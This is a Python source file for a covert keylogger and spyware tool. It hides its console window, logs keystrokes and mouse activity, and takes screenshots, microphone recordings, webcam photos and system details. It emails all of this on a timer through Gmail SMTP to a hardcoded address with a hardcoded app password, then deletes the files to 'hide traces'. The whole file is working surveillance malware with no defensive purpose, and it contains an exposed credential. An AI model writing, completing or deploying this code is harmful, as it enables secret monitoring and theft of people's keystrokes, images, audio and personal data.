import os
import logging
import smtplib
import socket
import threading
import pyscreenshot as ImageGrab
from pynput import keyboard
from pynput.keyboard import Listener
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from datetime import datetime
import sounddevice as sd
import wave
import platform  # For system information
import cv2  # For camera access
import ctypes  # For hiding console window

# Hide the console window when running with pythonw
try:
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
except:
    pass

# Setup silent logging to file instead of console
logging.basicConfig(
    filename="keylogger.log",
    level=logging.INFO,
    format="%(asctime)s - %(message)s"
)

# Email credentials
EMAIL_ADDRESS = "anonymousalter99@gmail.com"  # Your email address
EMAIL_PASSWORD = "xbsbaeevmfuokhnv"  # Your App Password (replace with your App Password)

class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger Started...\n"
        self.email = email
        self.password = password

    def appendlog(self, string):
        self.log += string

    def on_move(self, x, y):
        current_move = f"Mouse moved to {x}, {y}\n"
        logging.info(current_move)
        self.appendlog(current_move)

    def on_click(self, x, y, button, pressed):
        current_click = f"Mouse {'pressed' if pressed else 'released'} at {x}, {y} with {button}\n"
        logging.info(current_click)
        self.appendlog(current_click)

    def on_scroll(self, x, y, dx, dy):
        current_scroll = f"Mouse scrolled at {x}, {y} ({dx}, {dy})\n"
        logging.info(current_scroll)
        self.appendlog(current_scroll)

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = f" {str(key)} "
        self.appendlog(current_key)

    def send_mail(self, subject, message, attachment=None, filename=None):
        msg = MIMEMultipart()
        msg['From'] = self.email
        msg['To'] = self.email
        msg['Subject'] = subject

        msg.attach(MIMEText(message, 'plain'))

        if attachment and filename:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment)
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f"attachment; filename={filename}")
            msg.attach(part)

        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            # Silent mode - no prints
            server.login(self.email, self.password)
            text = msg.as_string()
            server.sendmail(self.email, self.email, text)
            server.quit()
            # Log silently instead of printing
            logging.info(f"Email sent: {subject}")
        except Exception as e:
            logging.error(f"Failed to send email: {e}")

    def system_information(self):
        logging.info("Collecting system information...")
        try:
            # Gather system information
            system_info = {
                "OS": platform.system(),
                "OS Version": platform.version(),
                "OS Release": platform.release(),
                "Processor": platform.processor(),
                "Machine": platform.machine(),
                "Hostname": socket.gethostname(),
                "IP Address": socket.gethostbyname(socket.gethostname()),
                "User": os.getlogin(),
            }

            # Save system information to a file
            filename = "system_info.txt"
            with open(filename, "w") as file:
                for key, value in system_info.items():
                    file.write(f"{key}: {value}\n")
            logging.info(f"System information saved to {filename}")

            # Read the file and send it via email
            with open(filename, "rb") as f:
                attachment = f.read()
                self.send_mail("System Information", "System information attached.", attachment, filename)
            
            # Remove the file after sending to hide traces
            try:
                os.remove(filename)
            except:
                pass

        except Exception as e:
            logging.error(f"Failed to collect system information: {e}")

    def record_audio(self, duration=60):
        logging.info("Recording audio...")
        filename = "audio.wav"
        fs = 16000  # Sample rate
        try:
            recording = sd.rec(int(duration * fs), samplerate=fs, channels=2, dtype='int16')
            sd.wait()  # Wait until recording is finished
            with wave.open(filename, 'wb') as wf:
                wf.setnchannels(2)
                wf.setsampwidth(2)
                wf.setframerate(fs)
                wf.writeframes(recording.tobytes())
            logging.info(f"Audio recorded and saved as {filename}")
            with open(filename, "rb") as f:
                attachment = f.read()
                self.send_mail("Audio Recording", "Audio recording attached.", attachment, filename)
            
            # Remove the file after sending to hide traces
            try:
                os.remove(filename)
            except:
                pass
                
        except Exception as e:
            logging.error(f"Failed to record audio: {e}")

    def capture_camera(self):
        logging.info("Capturing from camera...")
        filename = "camera_capture.jpg"
        try:
            # Initialize camera (0 is usually the default webcam)
            cap = cv2.VideoCapture(0)
            
            # Check if camera opened successfully
            if not cap.isOpened():
                logging.error("Error: Could not open camera.")
                return
                
            # Set camera properties to improve brightness
            cap.set(cv2.CAP_PROP_BRIGHTNESS, 150)  # Increase brightness (default is usually 100)
            cap.set(cv2.CAP_PROP_CONTRAST, 150)    # Increase contrast
            cap.set(cv2.CAP_PROP_EXPOSURE, 10)      # Auto exposure
            
            # Capture a single frame
            ret, frame = cap.read()
            
            if ret:
                # Enhance the image brightness using OpenCV
                # Convert to HSV and increase V channel (brightness)
                hsv = cv2.cvtColor(frame, cv2.COLOR_BGR2HSV)
                h, s, v = cv2.split(hsv)
                
                # Increase brightness by applying a gain factor
                gain = 1.5  # Brightness multiplier (adjust as needed)
                v = cv2.multiply(v, gain)
                
                # Cap values that exceed 255
                v[v > 255] = 255
                
                # Merge channels back and convert to BGR
                final_hsv = cv2.merge((h, s, v))
                frame = cv2.cvtColor(final_hsv, cv2.COLOR_HSV2BGR)
                
                # Save the enhanced captured frame
                cv2.imwrite(filename, frame)
                logging.info(f"Camera capture saved as {filename}")
                
                # Release the camera
                cap.release()
                
                # Send the captured image via email
                with open(filename, "rb") as f:
                    attachment = f.read()
                    self.send_mail("Camera Capture", "Camera capture attached.", attachment, filename)
                
                # Remove the file after sending to hide traces
                try:
                    os.remove(filename)
                except:
                    pass
                    
            else:
                logging.error("Failed to capture image from camera")
                
        except Exception as e:
            logging.error(f"Failed to capture from camera: {e}")

    def report(self):
        self.system_information()  # Collect and send system information
        self.screenshot()  # Capture and send a screenshot
        self.record_audio()  # Record and send audio
        self.capture_camera()  # Capture and send camera image
        self.send_mail("Keylogger Report", self.log)  # Send key logs
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def screenshot(self):
        logging.info("Taking screenshot...")
        filename = "screenshot.png"
        try:
            img = ImageGrab.grab()
            img.save(filename)
            logging.info(f"Screenshot saved as {filename}")
            with open(filename, "rb") as f:
                attachment = f.read()
                self.send_mail("Screenshot", "Screenshot attached.", attachment, filename)
            
            # Remove the file after sending to hide traces
            try:
                os.remove(filename)
            except:
                pass
                
        except Exception as e:
            logging.error(f"Failed to take screenshot: {e}")

    def run(self):
        with keyboard.Listener(on_press=self.save_data) as keyboard_listener:
            self.report()
            keyboard_listener.join()

        # Mouse listener
        from pynput.mouse import Listener as MouseListener
        with MouseListener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
            mouse_listener.join()

# Initialize and run the keylogger
keylogger = KeyLogger(60, EMAIL_ADDRESS, EMAIL_PASSWORD)
keylogger.run()     